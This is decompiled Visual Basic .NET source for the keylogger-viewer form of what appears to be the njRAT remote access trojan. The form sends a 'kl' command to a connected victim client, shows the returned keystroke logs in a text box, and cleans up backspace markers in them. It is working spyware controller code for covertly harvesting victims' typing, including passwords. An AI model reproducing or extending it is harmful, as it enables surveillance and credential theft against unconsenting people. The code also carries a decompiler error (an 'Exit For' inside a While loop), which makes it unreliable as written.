Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000012 RID: 18
	<DesignerGenerated()>
	Public Partial Class kl
		Inherits Form

		' Token: 0x06000232 RID: 562 RVA: 0x000144C0 File Offset: 0x000126C0
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = kl.__ENCList
			SyncLock _ENCList
				If kl.__ENCList.Count = kl.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = kl.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = kl.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								kl.__ENCList(num) = kl.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					kl.__ENCList.RemoveRange(num, kl.__ENCList.Count - num)
					kl.__ENCList.Capacity = kl.__ENCList.Count
				End If
				kl.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170000C9 RID: 201
		' (get) Token: 0x06000235 RID: 565 RVA: 0x00014B4C File Offset: 0x00012D4C
		' (set) Token: 0x06000236 RID: 566 RVA: 0x00002C94 File Offset: 0x00000E94
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x170000CA RID: 202
		' (get) Token: 0x06000237 RID: 567 RVA: 0x00014B64 File Offset: 0x00012D64
		' (set) Token: 0x06000238 RID: 568 RVA: 0x00002C9D File Offset: 0x00000E9D
		Friend Overridable Property MenuStrip1 As MenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._MenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As MenuStrip)
				Me._MenuStrip1 = value
			End Set
		End Property

		' Token: 0x170000CB RID: 203
		' (get) Token: 0x06000239 RID: 569 RVA: 0x00014B7C File Offset: 0x00012D7C
		' (set) Token: 0x0600023A RID: 570 RVA: 0x00014B94 File Offset: 0x00012D94
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				If Me._ToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._ToolStripMenuItem1.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				If Me._ToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._ToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000CC RID: 204
		' (get) Token: 0x0600023B RID: 571 RVA: 0x00014BEC File Offset: 0x00012DEC
		' (set) Token: 0x0600023C RID: 572 RVA: 0x00014C04 File Offset: 0x00012E04
		Friend Overridable Property ToolStripMenuItem2 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem2_Click
				If Me._ToolStripMenuItem2 IsNot Nothing Then
					RemoveHandler Me._ToolStripMenuItem2.Click, value2
				End If
				Me._ToolStripMenuItem2 = value
				If Me._ToolStripMenuItem2 IsNot Nothing Then
					AddHandler Me._ToolStripMenuItem2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000CD RID: 205
		' (get) Token: 0x0600023D RID: 573 RVA: 0x00014C5C File Offset: 0x00012E5C
		' (set) Token: 0x0600023E RID: 574 RVA: 0x00002CA6 File Offset: 0x00000EA6
		Friend Overridable Property TFind As ToolStripTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TFind
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripTextBox)
				Me._TFind = value
			End Set
		End Property

		' Token: 0x170000CE RID: 206
		' (get) Token: 0x0600023F RID: 575 RVA: 0x00014C74 File Offset: 0x00012E74
		' (set) Token: 0x06000240 RID: 576 RVA: 0x00014C8C File Offset: 0x00012E8C
		Friend Overridable Property ToolStripMenuItem3 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem3_Click
				If Me._ToolStripMenuItem3 IsNot Nothing Then
					RemoveHandler Me._ToolStripMenuItem3.Click, value2
				End If
				Me._ToolStripMenuItem3 = value
				If Me._ToolStripMenuItem3 IsNot Nothing Then
					AddHandler Me._ToolStripMenuItem3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000CF RID: 207
		' (get) Token: 0x06000241 RID: 577 RVA: 0x00014CE4 File Offset: 0x00012EE4
		' (set) Token: 0x06000242 RID: 578 RVA: 0x00002CAF File Offset: 0x00000EAF
		Friend Overridable Property T1 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Me._T1 = value
			End Set
		End Property

		' Token: 0x170000D0 RID: 208
		' (get) Token: 0x06000243 RID: 579 RVA: 0x00014CFC File Offset: 0x00012EFC
		' (set) Token: 0x06000244 RID: 580 RVA: 0x00002CB8 File Offset: 0x00000EB8
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x170000D1 RID: 209
		' (get) Token: 0x06000245 RID: 581 RVA: 0x00014D14 File Offset: 0x00012F14
		' (set) Token: 0x06000246 RID: 582 RVA: 0x00014D2C File Offset: 0x00012F2C
		Friend Overridable Property CopyToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyToolStripMenuItem_Click
				If Me._CopyToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopyToolStripMenuItem.Click, value2
				End If
				Me._CopyToolStripMenuItem = value
				If Me._CopyToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D2 RID: 210
		' (get) Token: 0x06000247 RID: 583 RVA: 0x00014D84 File Offset: 0x00012F84
		' (set) Token: 0x06000248 RID: 584 RVA: 0x00014D9C File Offset: 0x00012F9C
		Friend Overridable Property SelectAllToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._SelectAllToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SelectAllToolStripMenuItem_Click
				If Me._SelectAllToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._SelectAllToolStripMenuItem.Click, value2
				End If
				Me._SelectAllToolStripMenuItem = value
				If Me._SelectAllToolStripMenuItem IsNot Nothing Then
					AddHandler Me._SelectAllToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x06000249 RID: 585 RVA: 0x00002CC1 File Offset: 0x00000EC1
		Public Sub New()
			kl.__ENCAddToList(Me)
			Me.listViewItem_0 = Nothing
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600024A RID: 586 RVA: 0x00014DF4 File Offset: 0x00012FF4
		Public Sub insert(T As String)
			If T.StartsWith(ChrW(1)) And T.EndsWith(ChrW(1)) Then
				Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
				Me.T1.SelectionColor = Color.SteelBlue
				Me.T1.AppendText(vbCrLf & "[ " + T.Replace(ChrW(1), String.Empty) + "]" & vbCrLf)
			Else
				Me.T1.SelectionFont = Me.T1.Font
				Me.T1.SelectionColor = Me.T1.ForeColor
				Me.T1.AppendText(T + vbCrLf)
			End If
		End Sub

		' Token: 0x0600024B RID: 587 RVA: 0x00002CDC File Offset: 0x00000EDC
		Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.Copy()
		End Sub

		' Token: 0x0600024C RID: 588 RVA: 0x00014EB4 File Offset: 0x000130B4
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Try
				Me.c.Send("kl")
				Me.ToolStripMenuItem1.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600024D RID: 589 RVA: 0x00002CE9 File Offset: 0x00000EE9
		Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.SelectAll()
		End Sub

		' Token: 0x0600024E RID: 590 RVA: 0x00014F00 File Offset: 0x00013100
		Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			If Me.T1.Find(Me.TFind.Text, Me.T1.SelectionStart + Me.T1.SelectionLength, RichTextBoxFinds.None) = -1 Then
				Me.T1.Find(Me.TFind.Text, 0, RichTextBoxFinds.None)
			End If
		End Sub

		' Token: 0x0600024F RID: 591 RVA: 0x00014F5C File Offset: 0x0001315C
		Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Try
				Dim num As Integer = 1
				Dim dataObject As IDataObject = Clipboard.GetDataObject()
				Me.T1.[ReadOnly] = False
				While num <> -1
					num = Me.T1.Find("[Back]", num, RichTextBoxFinds.None)
					If num > 0 Then
						Dim left As String = Me.T1.Text(num - 1).ToString()
						If Operators.CompareString(left, "]", False) = 0 OrElse Operators.CompareString(left, vbLf, False) = 0 Then
							Me.T1.[Select](num, "[back]".Length)
							Me.T1.Cut()
						Else
							Me.T1.[Select](num - 1, "[back]".Length + 1)
							Me.T1.Cut()
						End If
					End If
				End While
				Clipboard.SetDataObject(dataObject)
				Me.T1.[ReadOnly] = True
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x040000FB RID: 251
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040000FD RID: 253
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x040000FE RID: 254
		<AccessedThroughProperty("MenuStrip1")>
		Private _MenuStrip1 As MenuStrip

		' Token: 0x040000FF RID: 255
		<AccessedThroughProperty("ToolStripMenuItem1")>
		Private _ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x04000100 RID: 256
		<AccessedThroughProperty("ToolStripMenuItem2")>
		Private _ToolStripMenuItem2 As ToolStripMenuItem

		' Token: 0x04000101 RID: 257
		<AccessedThroughProperty("TFind")>
		Private _TFind As ToolStripTextBox

		' Token: 0x04000102 RID: 258
		<AccessedThroughProperty("ToolStripMenuItem3")>
		Private _ToolStripMenuItem3 As ToolStripMenuItem

		' Token: 0x04000103 RID: 259
		<AccessedThroughProperty("T1")>
		Private _T1 As RichTextBox

		' Token: 0x04000104 RID: 260
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x04000105 RID: 261
		<AccessedThroughProperty("CopyToolStripMenuItem")>
		Private _CopyToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000106 RID: 262
		<AccessedThroughProperty("SelectAllToolStripMenuItem")>
		Private _SelectAllToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000107 RID: 263
		Public c As Client

		' Token: 0x04000108 RID: 264
		Private listViewItem_0 As ListViewItem
	End Class
End Namespace
